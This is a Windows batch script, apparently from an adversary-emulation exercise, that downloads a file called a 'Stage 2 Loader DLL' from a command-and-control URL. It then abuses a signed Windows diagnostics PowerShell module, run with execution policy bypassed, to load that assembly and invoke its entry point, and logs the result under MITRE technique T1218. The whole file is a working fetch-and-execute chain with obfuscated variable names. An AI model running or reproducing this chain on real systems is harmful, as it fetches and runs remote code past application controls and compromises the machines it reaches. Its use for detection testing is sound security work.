@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aB3cD9eF=%APPDATA%\11975\c8242a76
SET gH1iJ2kL=bed9f7f7.txt
SET mN4oP5qR=https://10.0.0.49/stage/2/icon.png?11975-7
SET sT6uV7wX=ITZEL-S2B
SET yZ8aB1cD=11975
SET eF2gH3iJ=7
SET kL4mN5oP=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM ========== HEARTBEAT FETCH ==========
REM Download Stage 2 Loader DLL from C2 (heartbeat URL)
set "__outDir=!aB3cD9eF!"
set "__outFile=!gH1iJ2kL!"
set "__hbUrl=!mN4oP5qR!"
set "__logFile=!kL4mN5oP!"

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!sT6uV7wX!][!yZ8aB1cD!]: heartbeat_start>> "!__logFile!" 2>nul

curl -k -s -o "!__outDir!\!__outFile!" "!__hbUrl!" 2>&1
set "heartbeatErr=%errorlevel%"

REM Debug: heartbeat_complete
echo [!tsvar!][DEBUG][!sT6uV7wX!][!yZ8aB1cD!]: heartbeat_complete>> "!__logFile!" 2>nul

if not !heartbeatErr! equ 0 (
    REM If heartbeat fails, we still continue? Per spec, linear fetch then invoke; if curl fails, skip invocation? But spec doesn't say halt. We'll log failure but still attempt to invoke? Better to skip invocation if file missing. We'll check for file existence.
    REM We'll continue to log later; but the heartbeat step is done.
)

REM ========== POSITION WORKING DIRECTORY ==========
REM Debug: chdir_start
echo [!tsvar!][DEBUG][!sT6uV7wX!][!yZ8aB1cD!]: chdir_start>> "!__logFile!" 2>nul

cd /d "!__outDir!" 2>nul
set "cdErr=%errorlevel%"

REM Debug: chdir_result
echo [!tsvar!][DEBUG][!sT6uV7wX!][!yZ8aB1cD!]: chdir_result=!cdErr!>> "!__logFile!" 2>nul

REM ========== LOLBIN INVOCATION (PowerShell) ==========
REM Debug: rundll32_start (using 'rundll32_start' as per spec? Actually spec says "rundll32_start" but we use PowerShell, so use powershell_start)
echo [!tsvar!][DEBUG][!sT6uV7wX!][!yZ8aB1cD!]: powershell_start>> "!__logFile!" 2>nul

REM Execute PowerShell wrapper that loads the .NET DLL and invokes its entry point
REM Note: Inside PS -command, we use %APPDATA%\11975\c8242a76 and bed9f7f7.txt literals; patcher will replace them before script runs.
REM Also ensure full cmdlet names (ForEach-Object, Where-Object) not shorthand.
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; RegSnapin %APPDATA%\11975\c8242a76\\bed9f7f7.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
set "psErr=%errorlevel%"

REM Debug: powershell_complete
echo [!tsvar!][DEBUG][!sT6uV7wX!][!yZ8aB1cD!]: powershell_complete>> "!__logFile!" 2>nul

REM ========== LOGGING (TTP LINE) ==========
REM Generate timestamp with millisecond precision using PowerShell
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set "timestamp=%%t"

REM Build TTP line: T1218^|System Binary Proxy Execution, result based on psErr and heartbeatErr?
REM If heartbeat failed (curl non-zero or file missing), or ps non-zero, mark FAIL.
REM Determine overall success: if heartbeat succeeded (curl exit 0 and file exists) and ps exit 0.
if not exist "!__outDir!\!__outFile!" (
    set "ttpResult=FAIL"
    set "ttpError=missing_file"
) else (
    if !heartbeatErr! equ 0 (
        if !psErr! equ 0 (
            set "ttpResult=OK"
            set "ttpError="
        ) else (
            set "ttpResult=FAIL"
            set "ttpError=powershell_error !psErr!"
        )
    ) else (
        set "ttpResult=FAIL"
        set "ttpError=curl_error !heartbeatErr!"
    )
)

REM Log TTP line
echo [!timestamp!][TTP][!sT6uV7wX!][!yZ8aB1cD!]: T1218^|System Binary Proxy Execution=[!ttpResult!]:[!ttpError!]>> "!__logFile!" 2>&1

REM ========== END ==========
endlocal